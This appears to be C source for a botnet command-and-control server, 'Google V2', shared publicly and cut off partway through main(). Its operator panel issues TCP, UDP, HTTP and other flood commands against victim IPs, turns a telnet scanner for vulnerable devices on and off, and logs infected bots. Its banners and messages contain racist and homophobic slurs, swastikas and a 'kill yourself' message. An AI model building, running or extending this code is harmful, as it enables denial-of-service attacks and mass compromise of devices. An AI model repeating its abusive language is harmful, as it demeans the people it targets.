/*
GoogleV2
 ______   _______  _______  _______    _______  _______  ______    __   __  _______  ______    _______                                                      
|      | |       ||       ||       |  |       ||       ||    _ |  |  | |  ||       ||    _ |  |       |                                                     
|  _    ||   _   ||    _  ||    ___|  |  _____||    ___||   | ||  |  |_|  ||    ___||   | ||  |  _____|                                                     
| | |   ||  | |  ||   |_| ||   |___   | |_____ |   |___ |   |_||_ |       ||   |___ |   |_||_ | |_____                                                      
| |_|   ||  |_|  ||    ___||    ___|  |_____  ||    ___||    __  ||       ||    ___||    __  ||_____  |                                                     
|       ||       ||   |    |   |___    _____| ||   |___ |   |  | | |     | |   |___ |   |  | | _____| |                                                     
|______| |_______||___|    |_______|  |_______||_______||___|  |_|  |___|  |_______||___|  |_||_______|
ENJOY BRUHHHH
THIS IS THE FINAL AND LAST BUILD OF GOOGLE SERVER SIDE AND CLIENT IF U HAVE THIS CONSIDER YOURSELF LUCKY 
@dope.server
Now Free To Public Enjoy
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define MAXFDS 1000000

struct account {
    char id[20]; 
    char password[20];
};
static struct account accounts[5000]; //max users is set on 15 you can edit that to whatever 
struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
////////////////////////////////////
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
////////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}
static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Fuck Boy Change The Port You idiot\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[31m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[31m~> \x1b[0m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
                                           //WE ARE MAKING SURE THERE IS NO DUP CLIENTS
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {                  //WE ARE MAKE SURE AGAIN HERE BY SENDING !* LOLNOGTFO|!* GTFOFAG
									            if(send(infd, "!* GTFONIGGER\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
											    if(send(infd, "!* GTFOFAG\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* GTFODUP\n\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* DUPES\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* GTFOPUSSY\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* LOLNOGTFO\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
										send(infd, "!* FATCOCK\n", 11, MSG_NOSIGNAL);
										
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
                                                if(strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7; 
                                                        fprintf(telFD, "%s\n", line); // let's write it out to disk without checking what it is!
                                                        fflush(telFD);
                                                        TELFound++;
                                                        continue;
                                                }
                                                if(strstr(buf, "PROBING") == buf)
                                                {
                                                        char *line = strstr(buf, "PROBING");
                                                        scannerreport = 1;
                                                        continue;
                                                }
                                                if(strstr(buf, "REMOVING PROBE") == buf)
                                                {
                                                        char *line = strstr(buf, "REMOVING PROBE");
                                                        scannerreport = 0;
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        continue;
                                                }
 
                                                printf("buf: \"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; [+] Slaves Connected: %d [www.google.com] Hackers Connected: %d [+]%c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
                sleep(3);
        }
}
int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 
void *telnetWorker(void *sock)
{
		char usernamez[80];
        int thefd = (int)sock;
		int find_line;
        managesConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);
    
        FILE *fp;
        int i=0;
        int c;
        fp=fopen("login.txt", "r"); 
        while(!feof(fp)) 
		{
				c=fgetc(fp);
				++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
		{
			fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
			++j;
        }
        
        if(send(thefd, "\x1b[31mUsername? \x1b[30m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
		sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
        if(strcmp(nickstring, accounts[find_line].id) == 0){	
       	if(send(thefd, "\x1b[31m*           CONGRATULATIONS          *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;	
        if(send(thefd, "\x1b[31mPassword? \x1b[30m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[34m***********************************\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m*        JUST KILL YOURSELF       *\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[33m***********************************\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
		    sleep(5);
        goto end;
        fak:
		
		pthread_create(&title, NULL, &titleWriter, sock);
		char line1  [5000];
		char line2  [5000];
		char line3  [5000];
		char line4  [5000];
		char line5  [5000];
		char line6  [5000];
		char line7  [5000];
		char line8  [5000];
		char line9  [5000];
		char line10 [5000];
		char line11 [5000];
    
		sprintf(line1,     "\x1b[32m                                            ,,\r\n");    
		sprintf(line2,     "\x1b[34m  .g8'''bgd                               \x1b[32m`7MM\r\n");          
		sprintf(line3,     "\x1b[34m.dP'     `M                                 \x1b[32mMM\r\n");          
		sprintf(line4,     "\x1b[34mdM'       `   \x1b[31m,pW'Wq.   \x1b[33m,pW'Wq.   \x1b[34m.P'Ybmmm  \x1b[32mMM  \x1b[31m.gP'Ya\r\n");  
		sprintf(line5,     "\x1b[34mMM           \x1b[31m6W'   `Wb \x1b[33m6W'   `Wb \x1b[34m:MI  I8    \x1b[32mMM \x1b[31m,M'   Yb\r\n"); 
		sprintf(line6,     "\x1b[34mMM.    `7MMF'\x1b[31m8M     M8 \x1b[33m8M     M8  \x1b[34mWmmmP'    \x1b[32mMM \x1b[31m8M''''''\r\n"); 
		sprintf(line7,     "\x1b[34m`Mb.     MM  \x1b[31mYA.   ,A9 \x1b[33mYA.   ,A9 \x1b[34m8M         \x1b[32mMM \x1b[31mYM.    ,\r\n"); 
		sprintf(line8,     "\x1b[34m  `'bmmmdPY   \x1b[31m`Ybmd9'   \x1b[33m`Ybmd9'   \x1b[34mYMMMMMb \x1b[32m.JMML.\x1b[31m`Mbmmd'\r\n"); 
		sprintf(line9,     "\x1b[34m                                 6'     dP\r\n");              
		sprintf(line10,    "\x1b[34m                                  Ybmmmd'\r\n");                 
        sprintf(line11, "\r\n\x1b[37m       [+]-\x1b[31mWelcome %s To The Google V2\x1b[37m-[+]\r\n", accounts[find_line].id, buf);
		
		if(send(thefd, line1,  strlen(line1),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2,  strlen(line2),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3,  strlen(line3),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4,  strlen(line4),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5,  strlen(line5),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6,  strlen(line6),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7,  strlen(line7),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line8,  strlen(line8),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line9,  strlen(line9),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line10, strlen(line10), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line11, strlen(line11), MSG_NOSIGNAL) == -1) goto end;		
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
        if(strstr(buf, "STATUS")) 
        {
          sprintf(botnet, "[卐] Telnet devices: %d [-] Telnet status: %d [卐]\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	    }  

	    if(strstr(buf, "BOTS"))
		{  
		sprintf(botnet, "[卐] Bots Online: %d [-] Users Online: %d [卐]\r\n", clientsConnected(), managesConnected);
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	 
	    if(strstr(buf, "SHOW"))
		{  
        sprintf(botnet, "[卐] Bots Online: %d [-] Users Online: %d [卐]\r\n", clientsConnected(), managesConnected);
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	   }
		
        if(strstr(buf, "bots"))
		{  
	    sprintf(botnet, "[卐] Bots Online: %d [-] Users Online: %d [卐]\r\n", clientsConnected(), managesConnected);
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			}
	    if(strstr(buf, "RULES"))
		{  
		sprintf(botnet, "NO HITTING THE SAME IP MORE THEN TWICE\r\nNO ATTACKS ABOVE 1100\r\n");
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }	    
       if(strstr(buf, "EXTRA"))
		{  
		sprintf(botnet, "EXTRA HELP\r\n");
  		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	    sprintf(botnet, "!* TCP IP PORT TIME 32 all 0 1\r\nTHE IP=THE VICTIMS IP\r\nPORT LOOK IN THE PORT COMMAND\r\nTIME = HOW LONG DONT GO OVER 1500\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "PORTS"))
		{  
		sprintf(botnet, "xbox port 3074 psn port 443, 53, 3478 if you dont know the port use 80\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "!* SCANNER OFF"))
		{  
		sprintf(botnet, "STOPPING TELNET SCANNER\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* TCP"))
		{  
		sprintf(botnet, "TCP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* UDP"))
		{  
		sprintf(botnet, "UDP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* STD"))
		{  
		sprintf(botnet, "STD FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* CNC"))
		{  
		sprintf(botnet, "CNC FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* HTTPFLOOD"))
		{  
		sprintf(botnet, "HTTP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* HTTP"))
		{  
		sprintf(botnet, "HTTP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "!* SCANNER ON"))
		{  
		sprintf(botnet, "STARTING TELNET SCANNER\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "ports"))
		{  
		sprintf(botnet, "xbox port 3074 psn port 443, 53, 3478 if you dont know the port use 80\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "help")) 
	    {  
		sprintf(botnet, "\x1b[0;37m[卐]\x1b[0;34m]Attack Commands----------------------------------\x1b[0;37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;31m!* TCP [IP] [PORT] [TIME] 32 all 0 1 | TCP FLOOD\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;33m!* UDP [IP] [PORT] [TIME] 32 0 1 | UDP FLOOD\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;32m!* STD [IP] [PORT] [TIME] | STD FLOOD\r\n"); 
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "\x1b[0;34m!* CNC [IP] [ADMIN PORT] [TIME] | CNC FLOOD\r\n"); 
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;37m[卐]\x1b[0;31mExtra Commands------------------------------------\x1b[0;37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;33m!* KILLATTK | KILLS ALL ATTACKS\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;32m!* SCANNER ON | OFF | TURNS ON THE TELNET SCANNER\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "\x1b[0;37m[卐]\x1b[0;34mHaXoRz Commands------------------------------------\x1b[0;37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "\x1b[0;31mPORTS | SHOWS THE PORTS TO HIT WITH\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;33mEXTRA | EXTRA HELP WHEN IT COMES TO HITTING\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;32mBOTS | SHOW REAL BOT COUNT\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;34mCLEAR | CLEARS YOUR SCREEN\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
		 
		if(strstr(buf, "HELP")) 
	    {  
		  sprintf(botnet, "\x1b[0;37m[卐]\x1b[0;34m]Attack Commands----------------------------------\x1b[0;37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;31m!* TCP [IP] [PORT] [TIME] 32 all 0 1 | TCP FLOOD\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;33m!* UDP [IP] [PORT] [TIME] 32 0 1 | UDP FLOOD\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;32m!* STD [IP] [PORT] [TIME] | STD FLOOD\r\n"); 
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "\x1b[0;34m!* CNC [IP] [ADMIN PORT] [TIME] | CNC FLOOD\r\n"); 
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;37m[卐]\x1b[0;31mExtra Commands------------------------------------\x1b[0;37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;33m!* KILLATTK | KILLS ALL ATTACKS\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;32m!* SCANNER ON | OFF | TURNS ON THE TELNET SCANNER\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "\x1b[0;37m[卐]\x1b[0;34mHaXoRz Commands------------------------------------\x1b[0;37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "\x1b[0;31mPORTS | SHOWS THE PORTS TO HIT WITH\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;33mEXTRA | EXTRA HELP WHEN IT COMES TO HITTING\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;32mBOTS | SHOW REAL BOT COUNT\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[0;34mCLEAR | CLEARS YOUR SCREEN\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
	    if(strstr(buf, "CLEAR")){

        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line1,  strlen(line1),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2,  strlen(line2),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3,  strlen(line3),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4,  strlen(line4),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5,  strlen(line5),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6,  strlen(line6),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7,  strlen(line7),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line8,  strlen(line8),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line9,  strlen(line9),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line10, strlen(line10), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line11, strlen(line11), MSG_NOSIGNAL) == -1) goto end;	
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
     	}
	    if(strstr(buf, "clear")){
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line1,  strlen(line1),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2,  strlen(line2),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3,  strlen(line3),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4,  strlen(line4),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5,  strlen(line5),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6,  strlen(line6),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7,  strlen(line7),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line8,  strlen(line8),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line9,  strlen(line9),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line10, strlen(line10), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line11, strlen(line11), MSG_NOSIGNAL) == -1) goto end;	
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		}
        if(strstr(buf, "LOGOUT")) 
	    {  
 		  sprintf(botnet, "卐FUCK YOU %s GTFO!卐\r\n", accounts[find_line].id, buf);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  goto end;
		}
	    if(strstr(buf, "LOLNOGTFO")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "GTFOFAG")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
    	if(strstr(buf, "SH")) 
		{  
	    printf("ATTEMPT TO SHELL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("SH.log", "a");
        fprintf(logFile, "ATTEMPT TO STEAL BOTS %s\n", accounts[find_line].id, buf);
        fclose(logFile);
	    goto end;
		}
		if(strstr(buf, "SHELL")) 
		{  
		printf("ATTEMPT TO SHELL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("SH.log", "a");
        fprintf(logFile, "ATTEMPT TO STEAL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
				}
     			trim(buf);
                if(send(thefd, "\x1b[37m~> \x1b[0m", 11, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("report.log", "a");
                fprintf(logFile, "%s: \"%s\"\n",accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
void *telnetListener(int port)
{
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
		printf("\x1b[34mPrivate file,\x1b[31m if you have it, \x1b[33mDO \x1b[32mNOT \x1b[34mLEAK\x1b[0m\n");
        telFD = fopen("bots.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
